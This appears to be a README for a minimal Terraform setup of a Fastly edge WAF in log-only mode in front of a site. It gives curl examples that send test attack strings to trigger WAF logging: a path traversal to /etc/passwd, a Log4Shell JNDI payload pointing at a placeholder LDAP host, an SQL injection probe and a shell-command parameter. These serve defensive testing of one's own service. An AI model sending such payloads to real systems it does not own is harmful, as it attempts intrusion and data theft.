# minimum terraform edgewaf

## what
a bare minimum syntax example for getting a vcl+edgewaf service setup in front of a site

the vcl service is configured to pass all traffic (not cache)

the waf site is configured to log attacks (not block)

this provides traffic graphs in the fastly ui, and attack data in the sigsci ui, without actually caching or blocking anything

## howto
```
git clone https://github.com/jbartus/fastly-minimum-edge-waf.git
cd fastly-minimum-edge-waf/
terraform init
cp terraform.tfvars.example terraform.tfvars
# edit terraform.tfvars to populate the values
terraform apply
```

## examples
```
curl https://site_name.global.ssl.fastly.net/headers

curl https://site_name.global.ssl.fastly.net/headers -H 'user-agent: nikto'

curl 'https://site_name.global.ssl.fastly.net/headers?run=/bin/bash'

curl 'https://site_name.global.ssl.fastly.net/headers?cat=../../../etc/passwd'

curl https://site_name.global.ssl.fastly.net/headers -H 'x-attack: ${jndi:ldap://foo.bar.local:9999/path}'

curl 'https://site_name.global.ssl.fastly.net/headers?user=1+ORDER+BY+11'
```
